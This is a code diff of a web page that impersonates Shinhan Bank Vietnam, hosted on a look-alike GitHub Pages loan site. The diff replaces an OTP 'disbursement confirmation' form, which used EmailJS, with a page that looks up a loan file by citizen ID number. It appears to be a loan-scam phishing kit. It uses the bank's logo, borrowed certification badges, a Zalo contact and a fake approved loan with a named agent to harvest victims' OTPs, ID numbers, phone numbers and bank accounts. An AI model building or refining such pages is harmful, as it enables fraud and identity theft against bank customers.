@@ -3,405 +3,315 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Xác Nhận Giải Ngân Qua ATM - Shinhan Bank</title>
+    <title>Shinhan Bank - Kết Quả Xét Duyệt Hồ Sơ</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Lexend:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="icon" href="https://shinhan.com.vn/public/themes/shinhan/img/favicon2023.ico">
     <style>
+        /* ==================== CẤU HÌNH BIẾN MÀU SẮC VÀ FONT ==================== */
         :root {
             --shinhan-blue: #003087;
-            --shinhan-blue-light: #e6f0ff;
+            --shinhan-blue-dark: #002263;
+            --shinhan-green-text: #00803a; /* Màu xanh đậm hơn để đủ tương phản WCAG */
+            --shinhan-gray: #f3f4f6;
         }
         body {
-            font-family: 'Inter', sans-serif;
-            background-color: #f0f2f5;
+            font-family: 'Lexend', sans-serif;
+            background-color: var(--shinhan-gray);
         }
-        .bg-shinhan-blue { background-color: var(--shinhan-blue); }
-        .text-shinhan-blue { color: var(--shinhan-blue); }
-        .border-shinhan-blue { border-color: var(--shinhan-blue); }
-        .hover\:bg-shinhan-blue-dark:hover { background-color: #002263; }
+
+        /* ==================== CÁC LỚP TIỆN ÍCH VÀ HIỆU ỨNG ==================== */
+        .details-content { max-height: 0; overflow: hidden; transition: max-height 0.5s ease-in-out; }
+        .details-content.show { max-height: 2000px; }
+        .rotate-180 { transform: rotate(180deg); }
+        .fade-in { animation: fadeIn 0.5s ease-in-out; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
         
-        .otp-input:focus {
-            border-color: var(--shinhan-blue);
-            box-shadow: 0 0 0 2px rgba(0, 48, 135, 0.2);
+        .interactive-btn { transition: all 0.2s ease-in-out; }
+        .interactive-btn:hover { transform: translateY(-2px); box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        .amortization-table tbody tr:hover { background-color: #f9fafb; }
+
+        .skeleton-loader { background-color: #e5e7eb; border-radius: 0.25rem; animation: pulse 1.5s cubic-bezier(0.4, 0, 0.6, 1) infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: .5; } }
+        
+        /* ==================== THÔNG BÁO TOAST ==================== */
+        #toast-container { position: fixed; bottom: 1.5rem; right: 1.5rem; z-index: 9999; }
+        .toast-notification {
+            background-color: #2d3748; color: white; padding: 0.75rem 1.25rem; border-radius: 0.5rem; box-shadow: 0 10px 15px -3px rgba(0,0,0,0.1), 0 4px 6px -2px rgba(0,0,0,0.05);
+            transform: translateY(100px); opacity: 0;
+            transition: all 0.4s cubic-bezier(0.21, 1.02, 0.73, 1);
         }
-        .otp-input.error {
-            border-color: #ef4444;
-            box-shadow: 0 0 0 2px rgba(239, 68, 68, 0.2);
-        }
-        #gemini-modal-content .loader {
-            width: 48px;
-            height: 48px;
-            border: 5px solid #E5E7EB;
-            border-bottom-color: var(--shinhan-blue);
-            border-radius: 50%;
-            display: inline-block;
-            box-sizing: border-box;
-            animation: rotation 1s linear infinite;
-        }
-        @keyframes rotation {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .toast-notification.show { transform: translateY(0); opacity: 1; }
+
+        /* ==================== CẤU HÌNH CHO VIỆC IN ẤN ==================== */
+        @media print {
+            body { background-color: #fff; }
+            body * { visibility: hidden; }
+            #result-container, #result-container * { visibility: visible; }
+            #result-container { position: absolute; left: 0; top: 0; width: 100%; margin: 0; padding: 1rem; }
+            .no-print { display: none !important; }
+            .printable-card { box-shadow: none !important; border: 1px solid #ddd; }
+            .details-content.show { max-height: none !important; overflow: visible !important; }
         }
     </style>
-    <script>
-        emailjs.init('OrBsI926QI2_xBh1f');
-    </script>
 </head>
-<body class="bg-slate-100 text-slate-800">
+<body class="bg-gray-100">
 
-    <header class="bg-white shadow-sm sticky top-0 z-40">
-        <div class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
+    <div id="toast-container"></div>
+
+    <header class="bg-white shadow-sm sticky top-0 z-40 no-print">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
             <div class="flex items-center justify-between h-16">
                 <div class="flex-shrink-0">
                     <img src="https://shinhan.com.vn/public/themes/shinhan/img/shinhan_logo_2.svg" alt="Shinhan Bank Logo" class="h-8">
                 </div>
-                <div class="hidden md:block">
-                    <nav class="flex items-center space-x-2">
-                        <a href="#" class="text-gray-600 hover:text-shinhan-blue px-3 py-2 rounded-md text-sm font-medium">Trang Chủ</a>
-                        <a href="#" class="text-gray-600 hover:text-shinhan-blue px-3 py-2 rounded-md text-sm font-medium">Sản Phẩm</a>
-                        <a href="#" class="text-gray-600 hover:text-shinhan-blue px-3 py-2 rounded-md text-sm font-medium">Hỗ Trợ</a>
-                    </nav>
-                </div>
-                <div class="md:hidden">
-                    <button id="hamburger-button" class="inline-flex items-center justify-center p-2 rounded-md text-gray-400 hover:text-gray-500 hover:bg-gray-100 focus:outline-none" aria-expanded="false">
-                        <span class="sr-only">Mở menu chính</span>
-                        <svg class="block h-6 w-6" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" aria-hidden="true">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16m-7 6h7" />
-                        </svg>
-                        <svg class="hidden h-6 w-6" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" aria-hidden="true">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
-                        </svg>
-                    </button>
+                <div id="header-user-info" class="hidden items-center space-x-3">
+                    <span class="text-sm font-medium text-gray-600"></span>
+                    <div class="w-8 h-8 rounded-full bg-blue-100 text-[--shinhan-blue] flex items-center justify-center font-bold text-sm"></div>
                 </div>
             </div>
         </div>
-        <nav id="mobile-menu" class="md:hidden hidden bg-white border-t border-gray-200">
-            <div class="px-2 pt-2 pb-3 space-y-1 sm:px-3">
-                 <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/trang-chu.html" class="text-gray-600 hover:bg-gray-50 hover:text-shinhan-blue block px-3 py-2 rounded-md text-base font-medium">Trang Chủ</a>
-                <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/gioi-thieu.html" class="text-gray-600 hover:bg-gray-50 hover:text-shinhan-blue block px-3 py-2 rounded-md text-base font-medium">Giới Thiệu</a>
-                <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/ca-nhan.html" class="text-gray-600 hover:bg-gray-50 hover:text-shinhan-blue block px-3 py-2 rounded-md text-base font-medium">Lợi Ích</a>
-                <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/Evaluate-conditions.html" class="text-gray-600 hover:bg-gray-50 hover:text-shinhan-blue block px-3 py-2 rounded-md text-base font-medium">Đăng Ký Giải Ngân</a>
-                 <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/step5.html" class="text-gray-600 hover:bg-gray-50 hover:text-shinhan-blue block px-3 py-2 rounded-md text-base font-medium">Xem Kết Quả</a>
-                 <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/dieu-khoan-su-dung.html" class="text-gray-600 hover:bg-gray-50 hover:text-shinhan-blue block px-3 py-2 rounded-md text-base font-medium">Điều Khoản Sử Dụng</a>
-                 <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/support-center.html" class="text-gray-600 hover:bg-gray-50 hover:text-shinhan-blue block px-3 py-2 rounded-md text-base font-medium">Liên Hệ</a>
-            </div>
-        </nav>
     </header>
-    
-    <main class="max-w-2xl mx-auto px-4 sm:px-6 lg:px-8 py-8 md:py-12">
-        <ol class="flex items-center w-full mb-8">
-            <li class="flex w-full items-center text-shinhan-blue after:content-[''] after:w-full after:h-1 after:border-b after:border-blue-200 after:border-2 after:inline-block">
-                <span class="flex items-center justify-center w-10 h-10 bg-blue-100 text-shinhan-blue rounded-full shrink-0 font-bold">1</span>
-            </li>
-            <li class="flex w-full items-center text-shinhan-blue after:content-[''] after:w-full after:h-1 after:border-b after:border-blue-200 after:border-2 after:inline-block">
-                <span class="flex items-center justify-center w-10 h-10 bg-blue-100 text-shinhan-blue rounded-full shrink-0 font-bold">2</span>
-            </li>
-            <li class="flex items-center w-auto">
-                <span class="flex items-center justify-center w-10 h-10 bg-shinhan-blue text-white rounded-full shrink-0 font-bold">3</span>
-            </li>
-        </ol>
 
-        <div class="bg-white p-6 sm:p-8 rounded-xl shadow-lg">
+    <main class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 md:py-12">
+        
+        <div id="check-form-container" class="max-w-xl mx-auto bg-white p-6 sm:p-8 rounded-xl shadow-lg fade-in">
             <div class="text-center">
-                <h2 class="text-2xl font-bold text-slate-900">Xác Nhận Giải Ngân</h2>
-                <p class="text-slate-500 mt-1">Vui lòng kiểm tra lại thông tin và xác thực giao dịch.</p>
+                <h1 class="text-2xl font-bold text-[--shinhan-blue]">TRA CỨU KẾT QUẢ HỒ SƠ</h1>
+                <p class="text-slate-500 mt-1">Nhập số CCCD của bạn để xem trạng thái hồ sơ vay.</p>
             </div>
-            
-            <div class="mt-8 border-t border-b border-gray-200 py-6">
-                <h3 class="text-base font-semibold text-slate-800 mb-4">Chi tiết giao dịch</h3>
-                 <div class="space-y-4 text-sm">
-                    <div class="flex justify-between items-center">
-                        <span class="text-slate-500">Người thụ hưởng</span>
-                        <span class="font-medium text-slate-900 text-right" id="summaryName"></span>
-                    </div>
-                    <div class="flex justify-between items-center">
-                        <span class="text-slate-500">Ngân hàng thụ hưởng</span>
-                        <span class="font-medium text-slate-900 text-right" id="summaryBank"></span>
-                    </div>
-                    <div class="flex justify-between items-center">
-                        <span class="text-slate-500">Số tài khoản</span>
-                        <span class="font-medium text-slate-900 text-right" id="summaryAccountNumber"></span>
-                    </div>
-                    <div class="border-t border-dashed my-2"></div>
-                    <div class="flex justify-between items-center pt-2">
-                        <span class="text-slate-500 font-semibold">Số tiền giải ngân</span>
-                        <span class="font-bold text-shinhan-blue text-xl text-right" id="summaryAmount"></span>
-                    </div>
-                </div>
-            </div>
-
-            <div class="mt-6 text-center">
-                <p class="text-sm text-slate-600" id="otpMessage"></p>
-                <div class="mt-4">
-                    <label for="otp" class="block text-sm font-medium text-slate-800 mb-2">Nhập mã OTP</label>
-                    <input type="tel" id="otp" inputmode="numeric" class="otp-input w-full max-w-xs mx-auto px-4 py-2 text-center text-2xl tracking-[.5em] border border-slate-300 rounded-lg shadow-sm focus:outline-none transition" maxlength="8" />
-                    <p id="otp-error-inline" class="hidden mt-2 text-sm text-red-600"></p>
-                </div>
-                <p class="mt-4 text-sm font-semibold text-red-600" id="otpTimer" aria-live="polite">Còn 60 giây</p>
-            </div>
-
-            <div class="mt-8 flex flex-col items-center space-y-4">
-                <button class="w-full max-w-xs bg-shinhan-blue text-white font-bold py-3 px-4 rounded-lg hover:bg-shinhan-blue-dark focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-shinhan-blue transition-all duration-150 ease-in-out" onclick="verifyOTP()">Xác Nhận</button>
-                <button onclick="getFinancialAdvice()" class="text-sm text-shinhan-blue font-medium hover:underline transition">✨ Nhận Lời khuyên Tài chính</button>
+            <div class="mt-8 max-w-md mx-auto">
+                <form id="check-result-form" onsubmit="event.preventDefault(); checkResult();">
+                    <label for="cccd" class="block text-sm font-medium text-gray-700">Số Căn cước công dân</label>
+                    <input type="text" id="cccd" inputmode="numeric" placeholder="Nhập 12 chữ số" maxlength="12" class="mt-1 block w-full px-4 py-2 bg-white border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-1 focus:ring-[--shinhan-blue] focus:border-[--shinhan-blue]">
+                    <p id="cccdError" class="hidden mt-2 text-xs text-red-500">Số CCCD không hợp lệ. Vui lòng kiểm tra lại.</p>
+                    <button type="submit" class="mt-6 w-full flex justify-center py-3 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-[--shinhan-blue] hover:bg-[--shinhan-blue-dark] focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-[--shinhan-blue] interactive-btn">
+                        Kiểm tra kết quả
+                    </button>
+                </form>
             </div>
         </div>
+        
+        <div id="skeleton-container" class="hidden">
+            <div class="bg-white rounded-xl shadow-lg p-8">
+                <div class="h-8 w-1/2 mx-auto skeleton-loader"></div>
+                <div class="h-4 w-1/3 mx-auto skeleton-loader mt-4"></div>
+                <div class="grid grid-cols-1 lg:grid-cols-12 gap-8 mt-8">
+                    <div class="lg:col-span-8 space-y-6">
+                        <div class="h-20 w-full skeleton-loader"></div>
+                        <div class="h-48 w-full skeleton-loader"></div>
+                        <div class="h-64 w-full skeleton-loader"></div>
+                    </div>
+                    <div class="lg:col-span-4 space-y-6">
+                        <div class="h-32 w-full skeleton-loader"></div>
+                        <div class="h-40 w-full skeleton-loader"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div id="result-container" class="hidden"></div>
     </main>
-    
-    <!-- Custom Error Modal -->
-     <div id="errorModal" class="hidden fixed inset-0 bg-gray-900 bg-opacity-60 transition-opacity flex items-center justify-center p-4 z-50">
-        <div class="bg-white rounded-lg shadow-xl transform transition-all sm:max-w-sm sm:w-full p-6 text-center">
-            <p id="errorMessage" class="text-slate-700 mb-4"></p>
-            <button id="errorButton" class="w-full bg-shinhan-blue text-white px-4 py-2 rounded-md hover:bg-shinhan-blue-dark" onclick="closeErrorModal()">Thử lại</button>
-        </div>
-    </div>
-
-    <!-- Gemini Advice Modal -->
-    <div id="gemini-modal" class="hidden fixed inset-0 bg-gray-900 bg-opacity-60 transition-opacity flex items-center justify-center p-4 z-50">
-        <div class="bg-white rounded-lg shadow-xl transform transition-all sm:max-w-lg w-full">
-            <div class="flex justify-between items-center p-4 border-b border-gray-200">
-                <h3 class="text-lg font-semibold text-gray-900">✨ Lời khuyên Tài chính từ Gemini</h3>
-                <button onclick="closeGeminiModal()" class="text-gray-400 hover:text-gray-600 text-2xl">&times;</button>
-            </div>
-            <div id="gemini-modal-content" class="p-6 min-h-[200px] flex items-center justify-center">
-                <!-- Content will be injected here -->
-            </div>
-             <div class="p-4 bg-gray-50 border-t border-gray-200 text-right">
-                <button class="bg-shinhan-blue text-white px-4 py-2 text-sm rounded-md hover:bg-shinhan-blue-dark" onclick="closeGeminiModal()">Đã hiểu</button>
-            </div>
-        </div>
-    </div>
-    
-    <footer class="bg-slate-800 text-slate-400 mt-12 py-8">
-        <div class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 text-center text-xs">
-            <div class="flex justify-center space-x-4 mb-4">
-                <img src="https://napthe.zalopay.vn/static/desktop/images/logos/PCI.svg" alt="PCI DSS" class="h-10">
-                <img src="https://simg.zalopay.com.vn/zst/zlp-website/resources/images/footer/BCTLogo_1.png" alt="Bộ Công Thương" class="h-10">
-                <img src="https://napthengay.vn/logoSaleNoti.png" alt="Bộ Công Thương" class="h-10">
-            </div>
-            <p>Liên hệ: <a href="mailto:support@shinhanbank.vn" class="hover:underline">support@shinhanbank.vn</a> | Hotline: 1900-1234 | <a href="http://zalo.me/84762797077" class="hover:underline">Hỗ trợ Zalo</a></p>
-            <p class="mt-1">Dữ liệu được mã hóa với SSL. Kết nối an toàn.</p>
-            <p class="mt-4">© 2025 Shinhan Bank Việt Nam. All Rights Reserved.</p>
-            <p>Địa chỉ: Tầng 12, Tòa nhà Vincom Center, 72 Lê Thánh Tôn, Quận 1, TP. Hồ Chí Minh</p>
-        </div>
-    </footer>
 
     <script>
-        let otpCountdown = 60;
-        let otpInterval = null;
-        let formData = {};
-        let attemptCount = 0;
+        // ==================== KHAI BÁO BIẾN VÀ HÀM TIỆN ÍCH ====================
 
-        function setupMobileMenu() {
-            const hamburgerButton = document.getElementById('hamburger-button');
-            const mobileMenu = document.getElementById('mobile-menu');
-            if(!hamburgerButton || !mobileMenu) return;
-            const icons = hamburgerButton.querySelectorAll('svg');
-            hamburgerButton.addEventListener('click', () => {
-                const isExpanded = hamburgerButton.getAttribute('aria-expanded') === 'true';
-                hamburgerButton.setAttribute('aria-expanded', !isExpanded);
-                mobileMenu.classList.toggle('hidden');
-                icons.forEach(icon => icon.classList.toggle('hidden'));
-            });
+        // Khóa bí mật để giải mã dữ liệu (trong thực tế phải được bảo vệ ở server)
+        const SECRET_KEY = 'Sh1nh@nB@nk-Pr0j3ct-K3y-2o25!#';
+
+        // Hàm định dạng số
+        function formatNumber(n) { return n != null && !isNaN(n) ? Number(n).toLocaleString('vi-VN') : "N/A"; }
+
+        // Hàm đóng/mở các mục chi tiết
+        function toggleDetails(el) { el.nextElementSibling.classList.toggle('show'); el.querySelector('.toggle-icon').classList.toggle('rotate-180'); }
+
+        // Hàm sao chép vào clipboard và hiển thị thông báo
+        function copyToClipboard(text, type) { 
+            if (!text) return; 
+            navigator.clipboard.writeText(text).then(() => showToast(`Đã sao chép ${type}`)); 
         }
         
-        function clearOTPInput() {
-            const otpInput = document.getElementById('otp');
-            const otpErrorInline = document.getElementById('otp-error-inline');
-            if (otpInput) {
-                otpInput.value = '';
-                otpInput.classList.remove('error');
-                otpInput.focus();
-            }
-            if(otpErrorInline){
-                otpErrorInline.classList.add('hidden');
-            }
+        // Hàm lấy lời chào theo thời gian
+        function getGreeting() { 
+            const h = new Date().getHours(); 
+            return h < 12 ? "Chào buổi sáng" : h < 18 ? "Chào buổi chiều" : "Chào buổi tối"; 
         }
 
-        function startOTPTimer() {
-            otpCountdown = 60;
-            const timerEl = document.getElementById('otpTimer');
-            if(!timerEl) return;
-            timerEl.textContent = `Thời gian còn lại: ${otpCountdown} giây`;
-            if (otpInterval) clearInterval(otpInterval);
+        // Hàm tạo hiệu ứng số chạy
+        function animateValue(element, start, end, duration) {
+            let startTimestamp = null;
+            const step = (timestamp) => {
+                if (!startTimestamp) startTimestamp = timestamp;
+                const progress = Math.min((timestamp - startTimestamp) / duration, 1);
+                const currentValue = Math.floor(progress * (end - start) + start);
+                element.innerHTML = `${formatNumber(currentValue)} <span class="text-2xl font-medium">VNĐ</span>`;
+                if (progress < 1) window.requestAnimationFrame(step);
+            };
+            window.requestAnimationFrame(step);
+        }
+        
+        // Hàm tải lịch trả nợ dạng CSV
+        function downloadAmortizationCSV(hoSo) {
+            if (!hoSo || !hoSo.loanAmount) { alert("Không có dữ liệu lịch trả nợ để tải."); return; }
+            let csvContent = "data:text/csv;charset=utf-8,";
+            csvContent += ["Ky", "Du No Dau Ky", "Tien Lai", "Tien Goc", "Tong Tra", "Du No Cuoi Ky"].join(",") + "\r\n";
+            const p = parseFloat(hoSo.loanAmount), t = parseInt(hoSo.loanTerm), r = parseFloat(hoSo.interestRate)/100/12, m = parseFloat(hoSo.monthlyPayment);
+            let balance = p;
+            for (let i = 1; i <= t; i++) {
+                const int = balance*r, princ = m-int, start = balance; balance -= princ;
+                csvContent += [i, Math.round(start), Math.round(int), Math.round(princ), Math.round(m), Math.round(balance<0?0:balance)].join(",") + "\r\n";
+            }
+            const link = document.createElement("a");
+            link.setAttribute("href", encodeURI(csvContent));
+            link.setAttribute("download", `lich_tra_no_${hoSo.loanCode}.csv`);
+            document.body.appendChild(link); link.click(); document.body.removeChild(link);
+        }
+
+        // Hàm hiển thị thông báo toast
+        function showToast(message) {
+            const container = document.getElementById('toast-container');
+            const toast = document.createElement('div');
+            toast.className = 'toast-notification';
+            toast.textContent = message;
+            container.appendChild(toast);
+            setTimeout(() => toast.classList.add('show'), 10);
+            setTimeout(() => {
+                toast.classList.remove('show');
+                toast.addEventListener('transitionend', () => toast.remove());
+            }, 3000);
+        }
+
+        // Hàm hiển thị giao diện skeleton
+        function showSkeleton() {
+            document.getElementById('check-form-container').classList.add('hidden');
+            document.getElementById('skeleton-container').classList.remove('hidden');
+        }
+
+        // Hàm cập nhật header với tên người dùng
+        function updateHeader(hoSo) {
+            const userInfoDiv = document.getElementById('header-user-info');
+            const nameParts = hoSo.fullName.split(' ');
+            const name = nameParts.length > 1 ? nameParts.slice(1).join(' ') : nameParts[0]; // Lấy Tên + Tên đệm
+            const initial = hoSo.fullName.charAt(0).toUpperCase();
+            userInfoDiv.querySelector('span').textContent = `Xin chào, ${name}`;
+            userInfoDiv.querySelector('div').textContent = initial;
+            userInfoDiv.classList.remove('hidden');
+            userInfoDiv.classList.add('flex');
+        }
+        
+        // Hàm reset giao diện về trạng thái ban đầu
+        function resetUI() {
+            document.getElementById('result-container').innerHTML = '';
+            document.getElementById('result-container').classList.add('hidden');
+            document.getElementById('header-user-info').classList.add('hidden');
+            document.getElementById('check-form-container').classList.remove('hidden');
+            document.getElementById('cccd').value = '';
+        }
+
+        // ==================== HÀM RENDER GIAO DIỆN KẾT QUẢ ====================
+        function renderResult(hoSo) {
+            const resultContainer = document.getElementById('result-container');
+            const principal = parseFloat(hoSo.loanAmount) || 0;
+            const totalInterest = parseFloat(hoSo.totalInterest) || 0;
+            const totalRepay = principal + totalInterest;
+            const interestPercentage = totalRepay > 0 ? (totalInterest / totalRepay) * 100 : 0;
+            const principalPercentage = 100 - interestPercentage;
+
+            let amortizationHTML = '<p class="text-center text-gray-500 text-sm">Không thể tạo lịch trả nợ.</p>';
+            if (principal > 0 && hoSo.loanTerm && hoSo.interestRate && hoSo.monthlyPayment) {
+                const term=parseInt(hoSo.loanTerm), monthlyRate=parseFloat(hoSo.interestRate)/100/12, monthlyPayment=parseFloat(hoSo.monthlyPayment);
+                let balance=principal, rowsHTML='';
+                for (let i=1; i<=term; i++) {
+                    const interestPaid=balance*monthlyRate, principalPaid=monthlyPayment-interestPaid, startingBalance=balance; balance -= principalPaid;
+                    rowsHTML += `<tr class="amortization-table text-xs sm:text-sm"><td class="p-2 border text-center">${i}</td><td class="p-2 border text-right">${formatNumber(Math.round(startingBalance))}</td><td class="p-2 border text-right text-red-600">${formatNumber(Math.round(interestPaid))}</td><td class="p-2 border text-right text-[--shinhan-green-text]">${formatNumber(Math.round(principalPaid))}</td><td class="p-2 border text-right font-semibold">${formatNumber(Math.round(monthlyPayment))}</td><td class="p-2 border text-right font-bold text-blue-600">${formatNumber(Math.round(balance<0?0:balance))}</td></tr>`;
+                }
+                amortizationHTML = `<div class="overflow-x-auto"><table class="w-full border-collapse border"><thead class="bg-gray-100 text-xs sm:text-sm"><tr class="text-left"><th class="p-2 border">Kỳ</th><th class="p-2 border">Dư nợ đầu kỳ</th><th class="p-2 border">Tiền lãi</th><th class="p-2 border">Tiền gốc</th><th class="p-2 border">Tổng trả</th><th class="p-2 border">Dư nợ cuối kỳ</th></tr></thead><tbody>${rowsHTML}</tbody></table></div>`;
+            }
+
+            resultContainer.innerHTML = `
+            <div class="printable-card bg-white rounded-xl shadow-lg fade-in">
+                <div class="p-6 sm:p-8 border-b">
+                    <div class="text-gray-700">${getGreeting()}, <strong class="text-xl">${hoSo.fullName || 'N/A'}</strong></div>
+                    <p class="text-sm text-gray-500">Dưới đây là thông tin chi tiết về hồ sơ vay của Quý khách.</p>
+                </div>
+                <div class="p-6 md:p-8 grid grid-cols-1 lg:grid-cols-12 gap-8">
+                    <div class="lg:col-span-8 space-y-6">
+                        <div class="bg-blue-50 border-l-4 border-[--shinhan-blue] rounded-r-lg p-4">
+                            <p class="text-sm font-medium text-[--shinhan-blue]">SỐ TIỀN ĐƯỢC DUYỆT</p>
+                            <p id="animated-amount" class="text-4xl font-bold text-[--shinhan-blue] mt-1"></p>
+                        </div>
+                        <div class="border rounded-lg p-4">
+                            <h3 class="font-semibold text-gray-800 mb-4">Cơ cấu khoản vay</h3>
+                            <div class="grid grid-cols-1 sm:grid-cols-2 gap-6 items-center">
+                                <div class="relative w-48 h-48 mx-auto">
+                                    <svg class="w-full h-full transform -rotate-90" viewBox="0 0 36 36"><circle class="text-red-100" stroke="currentColor" stroke-width="3" fill="none" cx="18" cy="18" r="15.9155"></circle><circle class="text-[--shinhan-green-text]" stroke="currentColor" stroke-width="3" stroke-dasharray="${principalPercentage}, 100" fill="none" cx="18" cy="18" r="15.9155"></circle></svg>
+                                    <div class="absolute inset-0 flex flex-col items-center justify-center text-center"><span class="text-xs text-gray-500">Tổng trả</span><span class="font-bold text-lg text-gray-800">${formatNumber(totalRepay)}</span></div>
+                                </div>
+                                <div class="text-sm space-y-3"><div class="flex items-center"><span class="w-3 h-3 rounded-full bg-[--shinhan-green-text] mr-2"></span> Tiền gốc: <strong class="ml-auto text-lg">${formatNumber(principal)}</strong></div><div class="flex items-center"><span class="w-3 h-3 rounded-full bg-red-400 mr-2"></span> Tổng lãi: <strong class="ml-auto text-lg">${formatNumber(totalInterest)}</strong></div><hr class="my-2"><div class="flex items-center">Trả hàng tháng: <strong class="ml-auto font-bold text-base text-[--shinhan-blue]">${formatNumber(hoSo.monthlyPayment)}</strong></div></div>
+                            </div>
+                        </div>
+                        <div class="border rounded-lg">
+                            <button class="w-full flex justify-between items-center p-4 text-left font-semibold text-gray-700" onclick="toggleDetails(this)"><span class="pr-2">Lịch trả nợ Chi tiết (Dự kiến)</span><span class="toggle-icon text-gray-400 transition-transform rotate-180">▼</span></button>
+                            <div class="details-content show"><div class="p-2 sm:p-4 border-t">${amortizationHTML}</div></div>
+                        </div>
+                    </div>
+                    <div class="lg:col-span-4 space-y-6">
+                        <div class="bg-gray-50 rounded-lg p-4 border"><h3 class="font-semibold text-gray-800 mb-3 text-center">Chuyên viên hỗ trợ</h3><div class="flex items-center space-x-4"><img loading="lazy" src="https://i.pravatar.cc/100?u=${hoSo.cccd}" class="w-16 h-16 rounded-full ring-2 ring-blue-100"><div><h4 class="font-semibold text-gray-900">Lê Minh Anh</h4><p class="text-xs text-gray-500">Mã số: SHB0458</p></div></div><a href="tel:19001577" class="no-print block mt-4 w-full text-center py-2 px-3 border rounded-md text-sm font-medium text-white bg-[--shinhan-blue] hover:bg-[--shinhan-blue-dark] interactive-btn">Gọi hỗ trợ</a></div>
+                        <div class="bg-gray-50 rounded-lg p-4 border"><h3 class="font-semibold text-gray-800 mb-2">Bước tiếp theo</h3><ol class="list-decimal list-inside text-sm text-gray-700 space-y-2"><li><strong>Xác nhận:</strong> Chuyên viên sẽ sớm liên hệ Quý khách qua SĐT <strong class="text-[--shinhan-blue]">${hoSo.phone}</strong>.</li><li><strong>Ký hợp đồng:</strong> Chuẩn bị CCCD gốc để đối chiếu.</li><li><strong>Giải ngân:</strong> Tiền sẽ được chuyển vào TK <strong class="break-all">${hoSo.accountNumber}</strong>. <button onclick="copyToClipboard('${hoSo.accountNumber}', 'Số tài khoản')" aria-label="Sao chép số tài khoản giải ngân" class="no-print ml-1 text-gray-400 hover:text-blue-600 interactive-btn">❐</button></li></ol></div>
+                        <div class="bg-red-50 text-red-800 rounded-lg p-3 text-xs border border-red-200"><p class="font-bold">CẢNH BÁO BẢO MẬT!</p><p>Shinhan Bank **không bao giờ** yêu cầu Quý khách chuyển khoản bất kỳ loại phí nào để được giải ngân.</p></div>
+                    </div>
+                </div>
+                <div class="p-6 border-t mt-4 flex flex-col sm:flex-row gap-3 justify-between items-center no-print">
+                    <button onclick="resetUI()" aria-label="Quay lại trang tra cứu hồ sơ" class="w-full sm:w-auto flex items-center justify-center py-2 px-4 border border-gray-300 rounded-md text-sm font-medium text-gray-700 bg-white hover:bg-gray-50 interactive-btn"><svg class="w-5 h-5 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"></path></svg>Tra cứu hồ sơ khác</button>
+                    <div class="flex gap-3"><button onclick="downloadAmortizationCSV(window.currentHoSo)" aria-label="Tải lịch trả nợ dạng CSV" class="interactive-btn flex items-center justify-center py-2 px-4 border border-gray-300 rounded-md text-sm font-medium text-gray-700 bg-white hover:bg-gray-50">Tải lịch trả nợ</button><button onclick="window.print()" aria-label="In thông báo xét duyệt" class="interactive-btn flex items-center justify-center py-2 px-4 border border-gray-300 rounded-md text-sm font-medium text-gray-700 bg-white hover:bg-gray-50">In thông báo</button></div>
+                </div>
+            </div>`;
             
-            otpInterval = setInterval(() => {
-                otpCountdown--;
-                timerEl.textContent = `Thời gian còn lại: ${otpCountdown} giây`;
-                if (otpCountdown <= 0) {
-                    clearInterval(otpInterval);
-                    timerEl.textContent = `Mã OTP đã hết hiệu lực.`;
-                    clearOTPInput();
+            updateHeader(hoSo);
+            document.getElementById('skeleton-container').classList.add('hidden');
+            resultContainer.classList.remove('hidden');
+            const amountEl = document.getElementById('animated-amount');
+            if(amountEl) animateValue(amountEl, 0, principal, 1000);
+        }
+
+        // ==================== LOGIC CHÍNH VÀ SỰ KIỆN ====================
+        
+        function checkResult() {
+            const cccdInput = document.getElementById('cccd');
+            let cccd = cccdInput.value.replace(/\D/g, '');
+            if (!cccd || cccd.length !== 12) {
+                document.getElementById('cccdError').classList.remove('hidden'); return;
+            }
+            document.getElementById('cccdError').classList.add('hidden');
+            showSkeleton();
+            
+            setTimeout(() => {
+                try {
+                    const storedData = localStorage.getItem('userData');
+                    if (!storedData) throw new Error("Không tìm thấy hồ sơ nào trên trình duyệt này. Vui lòng đăng ký trước.");
+                    const decryptedBytes = CryptoJS.AES.decrypt(storedData, SECRET_KEY);
